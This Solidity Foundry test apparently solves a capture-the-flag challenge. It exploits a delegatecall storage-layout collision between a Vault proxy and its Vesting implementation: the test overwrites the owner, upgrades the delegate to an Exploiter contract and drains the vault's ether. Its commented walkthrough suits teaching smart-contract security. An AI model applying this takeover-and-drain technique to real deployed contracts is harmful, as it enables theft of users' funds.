// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

import "./utils/BaseTest.sol";
import "src/Vault.sol";
import "src/Vesting.sol";

contract VaultTest is BaseTest {
    Vault private vault;
    Vesting private vesting;

    constructor() {
        string[] memory userLabels = new string[](2);
        userLabels[0] = "Alice";
        userLabels[1] = "Bob";
        preSetUp(2, 100 ether, userLabels);
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();

        // Attach the contract to the addresses on the fork
        vault = Vault(payable(0xBBCf8b480F974Fa45ADc09F102496eDC38cb3a6C));
        vesting = Vesting(payable(0xF4755E3D2Ca9Cd6858999A0696AB8E1C96434edC));

        vm.label(address(vault), "Vault");
        vm.label(address(vesting), "Vesting");

        // assert Vault has funds
        assertEq(address(vault).balance, 0.2 ether);
    }

    function testTakeOwnership() public {
        address player = users[0];
        vm.startPrank(player, player);

        uint256 playerBalanceBefore = player.balance;
        uint256 vaultBalanceBefore = address(vault).balance;

        // What we want to do is to become the owner of the vault contract in order to be able to upgrade
        // it to an implementation that give us full control
        // The Vesting contract is the implementation of the Vault proxy contract
        // The vesting contract do not match the same storage layout of the Vault contract
        // and this enable us (leveraging other exploits in the Vault contract) to modify the Vault storage via the implementation

        // Further reading
        // - Solidity Docs: Delegatecall / Callcode and Libraries: https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#delegatecall-callcode-and-libraries
        // - SWC-112: Delegatecall to Untrusted Callee: https://swcregistry.io/docs/SWC-112
        // - How to Secure Your Smart Contracts: 6 Solidity Vulnerabilities and how to avoid them: Delegatecall: https://medium.com/loom-network/how-to-secure-your-smart-contracts-6-solidity-vulnerabilities-and-how-to-avoid-them-part-1-c33048d4d17d
        // - Sigma Prime Solidity Security: Delegatecall: https://blog.sigmaprime.io/solidity-security.html#delegatecall

        // What we want to do is to modify the `Vesting.duration` storage that would as a conseguence of the storage mismatch modify the
        // `Vault.owner` storage variable. If we become the owners we will be able to update the implementation pointer

        // Only the owner of or the Vault contract itself can access to the `fallback` function
        // that can execute methods on the implementation via delegatecall
        // The `execute` function allow us to execute arbitrary low-level call to a `_target` with an arbitrary payload
        // This enable us to call the Vault contract itself and execute via deletegate call an arbitrary payload
        // In this case we want to execute `setDuration` passing the `uint256` cast of our address
        // The Vesting contract would think to be updating the `duration` but in reality it's overriding the `Vault.owner` address
        vault.execute(address(vault), abi.encodeWithSignature("setDuration(uint256)", uint256(uint160(player))));

        // assert that we are now the new owners of the Vault contract
        assertEq(vault.owner(), player);

        // Upgrade the Vault contract implementation address to our own implementation
        Exploiter exploiter = new Exploiter();
        vault.upgradeDelegate(address(exploiter));

        // assert that we have correctly upgraded the implementation address
        assertEq(vault.delegate(), address(exploiter));

        // call via delegatecall the `withdraw` function of the new implementation passing by the Vault fallback
        (bool withdrawSuccess, ) = address(vault).call(abi.encodeWithSignature("withdraw()"));
        require(withdrawSuccess, "withdraw failed");

        vm.stopPrank();

        // Assert that the vault has no more funds and all has been
        // transferred to the player balance
        assertEq(player.balance, playerBalanceBefore + vaultBalanceBefore);
        assertEq(address(vault).balance, 0 ether);
    }
}

contract Exploiter {
    address public delegate;
    address public owner;

    function withdraw() external {
        (bool success, ) = payable(owner).call{value: address(this).balance}("");
        require(success, "transfer to owner failed");
    }
}
